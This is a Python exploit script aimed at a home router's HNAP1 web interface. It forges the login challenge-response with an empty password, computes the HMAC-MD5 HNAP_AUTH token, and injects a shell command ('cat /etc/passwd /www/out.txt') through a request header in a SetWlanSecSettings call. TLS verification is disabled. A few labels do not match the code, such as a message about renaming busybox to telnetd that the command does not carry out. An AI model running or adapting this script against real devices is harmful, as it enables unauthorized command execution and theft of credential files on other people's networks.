#patrick mcbrien
import hmac
import hashlib
import time
import math
import logging
import sys
import json
import requests
from urllib3.exceptions import InsecureRequestWarning

# Suppress only the single warning from urllib3 needed.
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# You must initialize logging, otherwise you'll not see debug output.
logging.basicConfig()
logging.getLogger().setLevel(logging.DEBUG)
requests_log = logging.getLogger("requests.packages.urllib3")
requests_log.propagate = True

def get_sha256(value):
    """Compute SHA256 hash of the given value."""
    hsobj = hashlib.sha256()
    hsobj.update(value.encode("utf-8"))
    return hsobj.hexdigest().upper()

def get_hmac_md5(value):
    """Compute HMAC MD5 hash of the given value."""
    message = value.encode("utf-8")
    return hmac.new(message, digestmod=hashlib.md5).hexdigest().upper()

def send_http(ip, port, https, headers, data):
    """Send HTTP POST request."""
    protocol = "https" if https else "http"
    url = f"{protocol}://{ip}:{port}/HNAP1/"
    
    try:
        res = requests.post(url=url, json=data, headers=headers, timeout=1, verify=False)
        res_text = res.text
        print(f"res_text\n===\n{res.text}\n===\n")
        
        challenge, cookie, public_key, login_result = parse_response(res_text)
        
    except Exception as e:
        print(f"Error occurred: {e}")
        return "", "", "", ""

    return challenge, cookie, public_key, login_result

def parse_response(response_text):
    """Parse JSON response and extract necessary fields."""
    challenge = ""
    cookie = ""
    public_key = ""
    login_result = ""

    try:
        data = json.loads(response_text)
        login_response = data.get("LoginResponse", {})

        challenge = login_response.get("Challenge", "")
        cookie = login_response.get("Cookie", "")
        public_key = login_response.get("PublicKey", "")
        login_result = login_response.get("LoginResult", "")

        print(f"[+] Challenge = {challenge}")
        print(f"[+] Cookie = {cookie}")
        print(f"[+] PublicKey = {public_key}")
        print(f"[+] LoginResult = {login_result}")

    except json.JSONDecodeError:
        print("Invalid JSON format")

    return challenge, cookie, public_key, login_result

def login_request(ip, port, https):
    """Perform login request."""
    json_post = {
        "Login": {
            "Action": "request",
            "Username": "Admin",
            "PrivateLogin": "Username",
            "login_password": "",
            "Captcha": ""
        }
    }

    headers = {
        "Host": ip,
        "X-Requested-With": "XMLHttpRequest",
        "SOAPAction": '"http://purenetworks.com/HNAP1/Login"',
        "Content-Type": "application/json; charset=UTF-8",
    }

    challenge, cookie, public_key, _ = send_http(ip, port, https, headers, json_post)

    if challenge == "":
        print("[-] Failed to retrieve challenge")
        sys.exit(1)

    return challenge, cookie, public_key

def login_login(ip, port, https, login_password, hnap_auth, time_now, cookie):
    """Send login request."""
    json_post = {
        "Login": {
            "Action": "request",
            "Username": "admin",
            "LoginPassword": "",
            "Captcha": "",
            "PrivateLogin": "LoginPassword"
        }
    }

    headers = {
        "Host": ip,
        "X-Requested-With": "XMLHttpRequest",
        "SOAPAction": '"http://purenetworks.com/HNAP1/Login"',
        "Content-Type": "application/json; charset=UTF-8",
        "Cookie": f"uid={cookie}",
    }

    send_http(ip, port, https, headers, json_post)
def get_hmac_key_md5(key, value):
    """get_hmac_key_md5"""
    message = value.encode("utf-8")
    return (
        hmac.new(key.encode("utf-8"), message, digestmod=hashlib.md5)
        .hexdigest()
        .upper()
    )
def set_virtual_server_settings(ip, port, https, hnap_auth, time_now, cookie, cmd):
    """Set virtual server settings."""
    json_post = {"SetWlanSecSettings":{"MotoWlanSecAction":"4","MotoWlanSecWpsEnabled":"0","MotoWlanSecWpaEnabled":"0","MotoWlanSecWpapskEnabled":"0","MotoWlanSecWpa2Enabled":"0","MotoWlanSecWpa2pskEnabled":"1","MotoWlanSecEnc":"1","MotoWlanSecRadiusSrv":"0.0.0.0","MotoWlanSecRadiusPort":"1812","MotoWlanSecRadiusKey":"ccd30765dfe4a9fbaa4c31abc1ecab7a5bd2ee4635a72069997c318b952d47b55bd2ee4635a72069997c318b952d47b55bd2ee4635a72069997c318b952d47b5","MotoWlanSecNMode":"1","MotoWlanSecWepEnabled":"0","MotoWlanSecWepKeyShow":"0","MotoWlanSecWepCurrKey":"1","MotoWlanSecWepKey1":"4856873a4eea4fc8483aa852e3c7de625bd2ee4635a72069997c318b952d47b55bd2ee4635a72069997c318b952d47b55bd2ee4635a72069997c318b952d47b5","MotoWlanSecWepKey2":"4856873a4eea4fc8483aa852e3c7de625bd2ee4635a72069997c318b952d47b55bd2ee4635a72069997c318b952d47b55bd2ee4635a72069997c318b952d47b5","MotoWlanSecWepKey3":"4856873a4eea4fc8483aa852e3c7de625bd2ee4635a72069997c318b952d47b55bd2ee4635a72069997c318b952d47b55bd2ee4635a72069997c318b952d47b5","MotoWlanSecWepKey4":"4856873a4eea4fc8483aa852e3c7de625bd2ee4635a72069997c318b952d47b55bd2ee4635a72069997c318b952d47b55bd2ee4635a72069997c318b952d47b5","MotoWlanSecWepPassPhrase":"","MotoWlanSecXXX":"XXX"}}
    

    headers = {
        "Host": ip,
        "X-Requested-With": cmd,
        "HNAP_AUTH": f"{hnap_auth} {time_now}",
        "SOAPAction": '"http://purenetworks.com/HNAP1/SetWlanSecSettings"',
        "Content-Type": "application/json; charset=UTF-8",
        "Cookie": f"uid={cookie}",
    }

    send_http(ip, port, https, headers, json_post)

def exploit():
    """Exploit."""
    target_ip = "192.168.0.1"
    target_port = 443
    target_https = True

    print("Login_request")
    challenge, cookie, public_key = login_request(target_ip, target_port, target_https)

    dummy_password = ""
    private_key = get_hmac_key_md5(public_key + dummy_password, challenge)
    print(f"[+] private_key : {private_key}")

    login_password = get_hmac_key_md5(private_key, challenge)
    print(f"[+] login_password : {login_password}")

    soap_namespace2 = "http://purenetworks.com/HNAP1/"
    action = "SetWlanSecSettings"
    soap_action = f'"{soap_namespace2}{action}"'
    print(f"[+] SOAPAction : {soap_action}")

    time_now = int(round(time.time() * 1000))
    time_now = math.floor(time_now) % 2000000000000
    time_now = "%d" % time_now
    print(f"[+] Time : {time_now}")

    hnap_auth = get_hmac_key_md5(private_key, time_now + soap_action)
    print(f"[+] HNAP_AUTH : {hnap_auth}")

    login_login(target_ip, target_port, target_https, login_password, hnap_auth, time_now, cookie)

    action = "SetWlanSecSettings"
    soap_action = f'"{soap_namespace2}{action}"'
    time_now = int(round(time.time() * 1000))
    time_now = math.floor(time_now) % 2000000000000
    time_now = "%d" % time_now
    hnap_auth = get_hmac_key_md5(private_key, time_now + soap_action)
    print("Renaming busybox to /tmp/telnetd")
    cmd = "cat /etc/passwd /www/out.txt"
    set_virtual_server_settings(
        target_ip, target_port, target_https, hnap_auth, time_now, cookie, cmd
    )

if __name__ == "__main__":
    exploit()
